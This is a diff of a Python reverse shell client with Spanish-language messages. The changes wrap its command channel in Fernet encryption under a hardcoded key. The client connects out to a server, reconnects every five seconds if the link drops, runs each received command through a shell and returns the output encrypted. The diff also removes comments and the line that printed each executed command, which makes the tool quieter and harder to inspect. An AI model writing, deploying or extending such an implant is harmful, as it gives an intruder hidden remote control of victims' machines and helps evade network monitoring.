@@ -1,19 +1,35 @@
 import socket
 import subprocess
-import sys
 import time
+import struct
+from cryptography.fernet import Fernet
+
+KEY = b"KI47J7RwYu5guRVjg1sdMAT6JDCZB5eMWWB5zVuC5GE="
+f = Fernet(KEY)
+
+
+def recv_exact(sock, n):
+    data = b""
+    while len(data) < n:
+        chunk = sock.recv(n - len(data))
+        if not chunk:
+            raise ConnectionError("Conexión cerrada")
+        data += chunk
+    return data
+
+def send_enc(sock, text):
+    encrypted = f.encrypt(text.encode())
+    sock.sendall(struct.pack(">I", len(encrypted)) + encrypted)
+
+def recv_enc(sock):
+    length = struct.unpack(">I", recv_exact(sock, 4))[0]
+    return f.decrypt(recv_exact(sock, length)).decode()
+
 
 def ejecutar(cmd):
-    """Ejecuta el comando y devuelve el output completo"""
     try:
-        resultado = subprocess.run(
-            cmd,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=15
-        )
-        output = resultado.stdout + resultado.stderr
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+        output = r.stdout + r.stderr
         return output if output.strip() else "[*] Sin output"
     except subprocess.TimeoutExpired:
         return "[!] Timeout"
@@ -22,7 +38,6 @@ def ejecutar(cmd):
 
 
 def conectar(host, port):
-    """Reintenta la conexión hasta que el server esté disponible"""
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -30,7 +45,7 @@ def conectar(host, port):
             print(f"[*] Conectado a {host}:{port}")
             return sock
         except:
-            print("[!] Sin conexión. Reintentando en 5s...")
+            print("[!] Reintentando en 5s...")
             time.sleep(5)
 
 
@@ -42,25 +57,15 @@ def main():
 
     while True:
         try:
-            data = sock.recv(4096)
-            if not data:
-                print("[!] Server cerrado")
-                break
-
-            cmd = data.decode("utf-8").strip()
-
+            cmd = recv_enc(sock)
             if cmd == "exit":
                 break
-
-            print(f"[*] Ejecutando: {cmd}")
-            output = ejecutar(cmd)
-            sock.sendall(output.encode("utf-8", errors="replace"))
-
+            send_enc(sock, ejecutar(cmd))
         except KeyboardInterrupt:
             break
         except Exception as e:
             print(f"[!] Conexión perdida: {e}")
-            sock = conectar(host, port)  # auto-reconecta
+            sock = conectar(host, port)
 
     sock.close()
 
